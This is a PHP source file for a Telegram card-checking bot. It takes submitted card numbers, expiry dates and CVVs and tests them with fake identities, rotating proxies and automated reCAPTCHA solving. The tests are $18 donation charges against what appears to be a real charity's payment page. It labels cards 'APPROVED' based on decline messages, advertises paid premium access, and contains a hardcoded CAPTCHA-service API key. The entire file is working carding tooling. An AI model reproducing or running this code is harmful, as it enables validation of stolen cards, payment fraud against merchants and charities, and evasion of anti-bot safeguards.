<?php
require_once __DIR__ . '/../common.php';
if(cmd($message, "an")){
        sendaction($chatId, typing);
$NameGater ='Anya';
$gateway = "/an $NameGater";
is_gateroff($NameGater); //off Gater
is_freeuser(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Stripe Auth</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!an card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $- Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>
"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #


$retry = 0;
	

start:

$rotate = rotate();
$socks5 = socks5();

if($retry > 3)
{
  bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Card - 🝂 <code>$cc|$mes|$ano|$cvv</code> 
Status - 🝂 Unknown UNK! ⚠️
Response - 🝂 null 
Gateway - 🝂 $NameGater
－－－－－－－－－－－－－－－－
[ INFO BIN CARD ]
Bin - 🝂 <code>$brand</code> - <code>$scheme</code> - <code>$type</code> 
Bank - 🝂 <code>$bank </code> 
Country - 🝂 <code>$country </code>$emoji 
－－－－－－－－－－－－－－－－
Proxy  - 🝂 Live! ✅ 
Checked by: <a href='tg://user?id=$userId'>$username</a>[$Rank]
Bot by  - 🝂 Thkss
－－－－－－－－－－－－－－－－</b>",
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id,
            'parse_mode'=>'HTML',
            'reply_markup'=> json_encode(['inline_keyboard'=>[
                [['text'=>'Buy a premium membership here!','url'=>"https://t.me/soldieranvil"]]
                ],'resize_keyboard'=>true])
            ]);  
return;
}

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 14);


$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');



if(strlen($ano) == 4){
    $ano = substr($ano, -2);
}



$curl = new CurlX;
$cookie = uniqid();

$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];


$req1 = $curl::Get('https://pay.banquest.com/agudathisraelofil', $headers = null , $cookie,$server);
$ajaxTime = trim(strip_tags($curl::ParseString($req1->body, "ajaxTime: '", "'")));

$ajaxToken = trim(strip_tags($curl::ParseString($req1->body, "ajaxToken: '", "'")));
$formId = trim(strip_tags($curl::ParseString($req1->body, "var formId =", ";")));






$solution = $solver->recaptchaV2(
    \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
    [
      'websiteURL'    => 'https://pay.banquest.com/',
      'websiteKey'    => '6LeBNasUAAAAAEW-Ha_mtWLnOVt-0yEOCXcsTjNg',
      'isInvisible'   =>  true,
    ]
);
$captcha = $solution["gRecaptchaResponse"];

$ccNumber = preg_replace('/^(\d{4})(\d{4})(\d{4})(\d{1,4})$/', '$1+$2+$3+$4', $cc);
if(strlen($ano) == 4){
    $ano = substr($ano, -2);
}


$req2 = $curl::Post('https://pay.banquest.com/pay/process/3646',$data = 'slug=agudathisraelofil&magstripe=&deviceKey=&command=sale&amount=18&predefined_amount_description=+%2418&description=Annual+Campaign&orderid=&start=06%2F11%2F2024&numleft=*&billfname='.$firstname.'&billlname='.$lastname.'&email='.urlencode($email).'&billphone='.$phone.'&billstreet='.urlencode($street).'&billcity=Olympia&billstate=WA&name='.$firstname.'+'.$lastname.'&is_anonymous=1&ccNumber='.$ccNumber.'&zip='.$zip.'&ccExpiryMonth='.$mes.'&ccExpiryYear='.$ano.'&ccSecurityCode='.$cvv.'&routing=&account=&accountHolder=&accountType=&g-recaptcha-response='.$captcha.'&ajaxTime='.$ajaxTime.'&ajaxToken='.$ajaxToken.'', $headers = ['accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://pay.banquest.com',
'referer: https://pay.banquest.com/agudathisraelofil',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
'x-requested-with: XMLHttpRequest',
], $cookie,$server);


$mgs = trim(strip_tags($curl::ParseString($req2->body, '"text":"', '"')));


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);

if(substr_count($req2->body, 'CVV2 Declined')){
$status = "APPROVED ✅ ";
$response = "CVV2 Declined";
}elseif(substr_count($req2->body, 'Gateway Rejected: cvv')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: cvv";
}elseif(substr_count($req2->body, 'Not sufficient funds')){
$status = "APPROVED ✅ #low_funds";
$response = "Not sufficient funds";
}else{
$status = "DECLINED #DEAD ❌";
$response = $mgs;
}


   bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id,
            'parse_mode'=>'HTML',
            'reply_markup'=> json_encode(['inline_keyboard'=>[
                [['text'=>'Buy a premium membership here!','url'=>"https://t.me/soldieranvil"]]
                ],'resize_keyboard'=>true])
            ]);  


}

?>

